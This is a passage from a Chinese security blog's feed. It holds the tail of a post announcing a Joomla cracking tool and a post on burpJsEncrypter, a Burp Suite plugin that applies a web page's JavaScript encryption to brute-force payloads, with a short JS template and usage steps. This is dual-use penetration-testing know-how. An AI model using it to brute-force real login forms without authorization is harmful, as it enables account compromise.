        <summary type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
]]></summary>
        <content type="html"><![CDATA[<p>✔️即兴开发，Enjoy it~~<!-- more --></p>
<!-- more -->
<p>项目地址：<a href="https://github.com/TheKingOfDuck/JoomlaCracker">https://github.com/TheKingOfDuck/JoomlaCracker</a></p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1586606413161.png" alt="" loading="lazy"></figure>
<p>使用Java开发，自动提取域名要素，debug在115行设置setProxy(true)即可。</p>
<p>一点点心得：<br>
Joomla和Dede性质差不多，99%的洞都是建立在有后台权限/低用户权限的情况下才能利用，谁日谁知道...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[重写一个burpJsEncrypter]]></title>
        <id>https://blog.thekingofduck.com/post/ReCode-A-BurpJsEncrypter/</id>
        <link href="https://blog.thekingofduck.com/post/ReCode-A-BurpJsEncrypter/">
        </link>
        <updated>2020-03-22T11:05:56.000Z</updated>
        <summary type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
]]></summary>
        <content type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
<!-- more -->
<h3 id="写在前面">写在前面</h3>
<p>先说说这个项目为什么会出现。<br>
c0ny1师傅写的<a href="https://github.com/c0ny1/jsEncrypter">jsEncrypter</a>其实已经能满足日常需求，我本人也是因为这个项目成为c0ny1师傅的&quot;粉丝&quot;的。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/15848722634917.jpg" alt="-w814" loading="lazy"></figure>
<p>使用过的师傅都知道这个项目依赖于<code>phantomjs</code>,别人我不知道,我自己老是忘记<code>phantomjs</code>的二进制我放哪儿了,而且每次启动啥的都比较麻烦。</p>
<p>在学习Java的过程中了解到官方在<code>JDK1.6</code>添加了新的<code>ScriptEngine</code>类,允许用户直接执行<code>js</code>代码,也就是说调用<code>phantomjs</code>这件事可以,但是没必要。</p>
<h3 id="代码编写">代码编写</h3>
<p>看看核心的实现方法：</p>
<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33.png" alt="F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F.png" alt="49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F" loading="lazy"></figure>
<p>调用了加载到内存中的<code>burpJsEncrypter</code>函数,代码如下：</p>
<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/B43B9A52-8508-4CC2-B058-C06AB5D5B79D.png" alt="B43B9A52-8508-4CC2-B058-C06AB5D5B79D" loading="lazy"></figure>
<p>是不是很简单...</p>
<p>再说说开发过程中遇到的最大的坑。</p>
<p>在代码中调试时使用<code>System.getProperty(&quot;user.dir&quot;)</code>获取当前路径时完全OK的,但是加载到内存后再获取就会变成：</p>
<pre><code>/var/folders/tg/z5wcq7jx3s526hykwz0pz2v00000gp/T/burp8120677802571630018.tmp/22js/
</code></pre>
<p>导致遍历<code>js</code>文件一致失败。</p>
<h3 id="如何使用">如何使用</h3>
<p>1.将本项目的js目录下的<code>js</code>文件复制到用户目录下的<code>/burp/jsFile</code>目录:</p>
<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/15848732791664.jpg" alt="-w834" loading="lazy"></figure>
<p>文件名咋命名完全无所谓,但是main.js中<code>burpJsEncrypter</code>函数一定要有,需要人工修改的加密逻辑也就是注释中间的内容：</p>
<pre><code>//Java调用的主函数
function burpJsEncrypter(rawPayload){

	var encryptedPayload;


	//===============加密开始=================

	encryptedPayload = hex_md5(rawPayload);

	//===============加密结束=================

	return encryptedPayload;
}
</code></pre>
<p>如上面的代码中的hex_md5函数是加载到内存中的其他js文件中的函数。实战中只需要把页面中所有涉及加密的js文件下载到这个目录即可。</p>
<p>2.设置Payload处理：</p>
<figure data-type="image" tabindex="6"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/08B84570-D584-4265-9505-27D7F5821E24.png" alt="08B84570-D584-4265-9505-27D7F5821E24" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/15848737403466.jpg" alt="-w647" loading="lazy"></figure>
<p>选完再开始爆破即可。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/15848739154768.jpg" alt="-w973" loading="lazy"></figure>
<p><strong>明文在哪儿看？</strong></p>
<figure data-type="image" tabindex="9"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/15848741045333.jpg" alt="-w628" loading="lazy"></figure>
<p><strong>支持再Repeater中加密？</strong></p>
<p>选中要加密的字段,右键选择<code>burpJsEncrypter</code>菜单即可。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.thekingofduck.com/post-images/burpJsEncrypter//15848705260967/15848741934886.jpg" alt="-w519" loading="lazy"></figure>
<h3 id="重要提醒">重要提醒</h3>
<p>如果c0ny1师傅那个插件你不会耍的画这个插件你估计也不会耍的,最核心的问题都是找页面中的加密逻辑,然后复制出来运行而已。</p>
<p><strong>即兴开发，Enjoy it~~</strong></p>
]]></content>
    </entry>
</feed>